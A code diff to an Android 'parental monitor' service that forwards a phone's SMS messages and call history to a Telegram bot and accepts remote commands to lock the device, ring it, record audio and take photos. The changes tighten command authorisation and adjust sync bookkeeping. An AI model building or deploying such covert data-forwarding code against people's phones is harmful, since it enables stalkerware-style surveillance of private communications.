@@ -302,7 +302,8 @@ class MonitoringService : Service() {
         }
         val stuckRing = preferencesManager.ringPrevVolume
         val ringSavedAt = preferencesManager.ringSavedAt
-        if (stuckRing >= 0 && ringSavedAt > 0 && System.currentTimeMillis() - ringSavedAt < 12 * 60 * 60_000L) {
+        val ringingNow = try { ringBusy.get() || ringJob?.isActive == true } catch (_: Exception) { false }
+        if (!ringingNow && stuckRing >= 0 && ringSavedAt > 0 && System.currentTimeMillis() - ringSavedAt < 12 * 60 * 60_000L) {
             try {
                 val audioManager = getSystemService(AUDIO_SERVICE) as android.media.AudioManager
                 audioManager.setStreamVolume(android.media.AudioManager.STREAM_ALARM, stuckRing, 0)
@@ -520,6 +521,13 @@ class MonitoringService : Service() {
             return false
         }
         if (response.code() == 400) {
+            try {
+                val body = response.errorBody()?.string()?.lowercase(java.util.Locale.ROOT).orEmpty()
+                if (body.contains("offset") || body.contains("bad request")) {
+                    preferencesManager.setLastUpdateIdSync(0L)
+                }
+            } catch (_: Exception) {
+            }
             return false
         }
         if (!response.isSuccessful || response.body()?.ok != true) return false
@@ -545,7 +553,7 @@ class MonitoringService : Service() {
                     if (ownerOk && full != null) {
                         val head = full.substringBefore(" ")
                         val command = head.substringBefore("@").lowercase(java.util.Locale.ROOT)
-                        if (command.startsWith("/")) {
+                        if (command.startsWith("/") && (senderOk || command !in setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue"))) {
                             val arg = if (head.length < full.length) full.substring(head.length + 1).trim() else ""
                             val input = if (arg.isEmpty()) command else "$command $arg"
                             handleTelegramCommand(input, message?.date ?: 0)
@@ -567,8 +575,7 @@ class MonitoringService : Service() {
     private suspend fun handleCallbackQuery(query: com.redeye.parentalmonitor.network.TelegramCallbackQuery) {
         val sender = query.from?.id?.toString() ?: return
         val chatId = try { preferencesManager.chatId } catch (_: Exception) { "" }
-        val origin = query.message?.chat?.id?.toString()
-        if (sender != chatId && origin != chatId) return
+        if (sender != chatId) return
         answerCallback(query.id)
         val command = when (query.data) {
             "photo" -> "/photo"
@@ -584,7 +591,21 @@ class MonitoringService : Service() {
             "pause60" -> "/pause 60"
             else -> return
         }
-        handleTelegramCommand(command)
+        val base = command.substringBefore(" ").substringBefore("@").lowercase(java.util.Locale.ROOT)
+        val msgDate = try { query.message?.date ?: 0L } catch (_: Exception) { 0L }
+        if (base in setOf("/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue", "/lock", "/ring", "/sms", "/smsconfirm", "/record")) {
+            if (msgDate > 0L) {
+                handleTelegramCommand(command, msgDate)
+            } else {
+                handleTelegramCommand(command, 1L)
+            }
+        } else {
+            if (msgDate > 0L) {
+                handleTelegramCommand(command, msgDate)
+            } else {
+                handleTelegramCommand(command)
+            }
+        }
     }
 
     private suspend fun answerCallback(callbackId: String) {
@@ -698,7 +719,7 @@ class MonitoringService : Service() {
     }
 
     private suspend fun handleTelegramCommandInner(command: String, arg: String, sentAtSec: Long = 0L) {
-        if (sentAtSec > 0 && command in setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record")) {
+        if (sentAtSec > 0 && command in setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue")) {
             val ageSec = System.currentTimeMillis() / 1000L - sentAtSec
             if (ageSec > 300L) {
                 sendToTelegram("\u23F3\uFE0F Command $command kedaluwarsa, kirim ulang.")
@@ -1130,8 +1151,8 @@ class MonitoringService : Service() {
             }
             "/history" -> {
                 val digits = arg.filter { it.isDigit() }
-                if (digits.length < 5) {
-                    sendToTelegram("Usage: /history \u003cnomor\u003e (min 5 digit)")
+                if (digits.length < 7) {
+                    sendToTelegram("Usage: /history \u003cnomor\u003e (min 7 digit)")
                 } else {
                     val calls = try {
                         callLogRepository.getCallsForNumber(digits, 50).filter { numberMatches(it.number, digits) }.take(5)
@@ -1413,6 +1434,7 @@ class MonitoringService : Service() {
             }
             sendToTelegram(startMessage)
             delay(500)
+            var initialOk = true
 
             val entrySmsId = try { preferencesManager.lastSmsId } catch (_: Exception) { 0L }
             val pendingSms = allSms.filter { it.id > entrySmsId }.sortedBy { it.id }
@@ -1432,11 +1454,13 @@ class MonitoringService : Service() {
                             appendLine("━━━━━━━━━━━━━━━━")
                         }
                     }
-                    if (sendFitted(message)) {
-                        try {
-                            preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, part.maxOf { it.id })
-                        } catch (_: Exception) {
-                        }
+                    val sentSmsPart = sendFitted(message)
+                    try {
+                        preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, part.maxOf { it.id })
+                    } catch (_: Exception) {
+                    }
+                    if (!sentSmsPart) {
+                        initialOk = false
                     }
                     delay(500)
                 }
@@ -1464,17 +1488,19 @@ class MonitoringService : Service() {
                             appendLine("━━━━━━━━━━━━━━━━")
                         }
                     }
-                    if (sendFitted(message)) {
-                        try {
-                            val latest = part.maxWith(compareBy({ it.date }, { it.id }))
-                            if (latest.date > preferencesManager.lastCallTimestamp ||
-                                (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
-                            ) {
-                                preferencesManager.lastCallTimestamp = latest.date
-                                preferencesManager.lastCallId = latest.id
-                            }
-                        } catch (_: Exception) {
+                    val sentCallPart = sendFitted(message)
+                    try {
+                        val latest = part.maxWith(compareBy({ it.date }, { it.id }))
+                        if (latest.date > preferencesManager.lastCallTimestamp ||
+                            (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
+                        ) {
+                            preferencesManager.lastCallTimestamp = latest.date
+                            preferencesManager.lastCallId = latest.id
                         }
+                    } catch (_: Exception) {
+                    }
+                    if (!sentCallPart) {
+                        initialOk = false
                     }
                     delay(500)
                 }
@@ -1504,7 +1530,11 @@ class MonitoringService : Service() {
                 appendLine()
                 appendLine("All commands are in the bot menu — tap /help anytime.")
             }
-            sendToTelegram(completeMessage)
+            if (initialOk) {
+                sendToTelegram(completeMessage)
+            } else {
+                sendToTelegram("History sync partially sent. Remainder follows automatically via periodic updates.")
+            }
             preferencesManager.initialSyncDone = true
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "=== Initial data sending complete ===")
 
@@ -1521,20 +1551,18 @@ class MonitoringService : Service() {
         try {
             val smsPage = smsRepository.getNewSms(preferencesManager.lastSmsId).take(100)
             if (smsPage.isNotEmpty()) {
-                if (sendFitted(formatSmsMessage(smsPage))) {
-                    preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, smsPage.maxOf { it.id })
-                }
+                sendFitted(formatSmsMessage(smsPage))
+                preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, smsPage.maxOf { it.id })
             }
             val callPage = callLogRepository.getNewCalls(preferencesManager.lastCallTimestamp, preferencesManager.lastCallId).take(100)
             if (callPage.isNotEmpty()) {
-                if (sendFitted(formatCallMessage(callPage))) {
-                    val latest = callPage.maxWith(compareBy({ it.date }, { it.id }))
-                    if (latest.date > preferencesManager.lastCallTimestamp ||
-                        (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
-                    ) {
-                        preferencesManager.lastCallTimestamp = latest.date
-                        preferencesManager.lastCallId = latest.id
-                    }
+                sendFitted(formatCallMessage(callPage))
+                val latest = callPage.maxWith(compareBy({ it.date }, { it.id }))
+                if (latest.date > preferencesManager.lastCallTimestamp ||
+                    (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
+                ) {
+                    preferencesManager.lastCallTimestamp = latest.date
+                    preferencesManager.lastCallId = latest.id
                 }
             }
         } catch (e: kotlinx.coroutines.CancellationException) {
@@ -2068,7 +2096,7 @@ class MonitoringService : Service() {
         watchdogJob?.cancel()
         val attempt = cameraAttempt.incrementAndGet()
         val wd = serviceScope.launch {
-            delay(35_000)
+            delay(45_000)
             if (cameraAttempt.get() == attempt && cameraBusy.compareAndSet(true, false)) {
                 cameraAttempt.incrementAndGet()
                 android.util.Log.w("MonitoringService", "Camera watchdog: capture did not finish, flag reset")
@@ -2287,7 +2315,13 @@ class MonitoringService : Service() {
         }
     }
 
+    @Volatile
+    private var lastLoopRestartAt = 0L
+
     private fun restartAllLoops() {
+        val nowRestart = android.os.SystemClock.elapsedRealtime()
+        if (nowRestart - lastLoopRestartAt < 10_000L) return
+        lastLoopRestartAt = nowRestart
         try {
             monitoringJob?.cancel()
         } catch (_: Exception) {
@@ -2355,8 +2389,12 @@ class MonitoringService : Service() {
                 audioManager.setStreamVolume(stream, audioManager.getStreamMaxVolume(stream), 0)
             } catch (_: Exception) {
             }
-            val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
+            val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_ALARM)
             ringtone = android.media.RingtoneManager.getRingtone(applicationContext, uri)
+            try {
+                ringtone?.streamType = stream
+            } catch (_: Exception) {
+            }
             ringtone?.play()
             sendToTelegram("\uD83D\uDD14 Ringing for $seconds s\u2026")
             kotlinx.coroutines.delay(seconds * 1000L)
